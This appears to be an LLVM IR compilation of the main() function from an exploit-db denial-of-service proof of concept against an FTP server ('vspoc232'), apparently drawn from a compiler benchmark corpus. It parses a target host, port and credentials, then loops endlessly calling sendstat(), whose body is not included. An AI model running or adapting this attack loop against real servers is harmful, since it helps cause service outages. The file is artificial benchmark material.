; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16270.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_16270.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.logindef = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@__const.main.passdef = private unnamed_addr constant [19 x i8] c"cxib.net@127.0.0.1\00", align 16
@.str = private unnamed_addr constant [168 x i8] c"\0AUse: ./vspoc232 host port [username] [password] [option]\0Ahost and port are requied\0Ause option = 1 to skip recv() fails\0A\0Aexample:\0A./vspoc232 127.0.0.1 21 user pass 1\0A\0A\00", align 1
@skip = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [36 x i8] c"----------------------------- next\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [10 x i8], align 1
  %9 = alloca [19 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = bitcast [10 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([10 x i8], [10 x i8]* @__const.main.logindef, i32 0, i32 0), i64 10, i1 false)
  %13 = bitcast [19 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([19 x i8], [19 x i8]* @__const.main.passdef, i32 0, i32 0), i64 19, i1 false)
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 3
  br i1 %15, label %16, label %19

16:                                               ; preds = %2
  %17 = call i32 @printf(i8* getelementptr inbounds ([168 x i8], [168 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 @exit(i32 1) #4
  unreachable

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  store i8* %22, i8** %10, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 2
  %25 = load i8*, i8** %24, align 8
  store i8* %25, i8** %11, align 8
  %26 = load i32, i32* %4, align 4
  %27 = icmp sle i32 4, %26
  br i1 %27, label %28, label %32

28:                                               ; preds = %19
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 3
  %31 = load i8*, i8** %30, align 8
  store i8* %31, i8** %6, align 8
  br label %34

32:                                               ; preds = %19
  %33 = getelementptr inbounds [10 x i8], [10 x i8]* %8, i64 0, i64 0
  store i8* %33, i8** %6, align 8
  br label %34

34:                                               ; preds = %32, %28
  %35 = load i32, i32* %4, align 4
  %36 = icmp sle i32 5, %35
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 4
  %40 = load i8*, i8** %39, align 8
  store i8* %40, i8** %7, align 8
  br label %43

41:                                               ; preds = %34
  %42 = getelementptr inbounds [19 x i8], [19 x i8]* %9, i64 0, i64 0
  store i8* %42, i8** %7, align 8
  br label %43

43:                                               ; preds = %41, %37
  %44 = load i32, i32* %4, align 4
  %45 = icmp sle i32 6, %44
  br i1 %45, label %46, label %47

46:                                               ; preds = %43
  store i32 1, i32* @skip, align 4
  br label %47

47:                                               ; preds = %46, %43
  br label %48

48:                                               ; preds = %47, %48
  %49 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %50 = load i8*, i8** %10, align 8
  %51 = load i8*, i8** %11, align 8
  %52 = load i8*, i8** %6, align 8
  %53 = load i8*, i8** %7, align 8
  %54 = call i32 @sendstat(i8* %50, i8* %51, i8* %52, i8* %53)
  %55 = call i32 @sleep(i32 1)
  br label %48
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sendstat(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @sleep(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
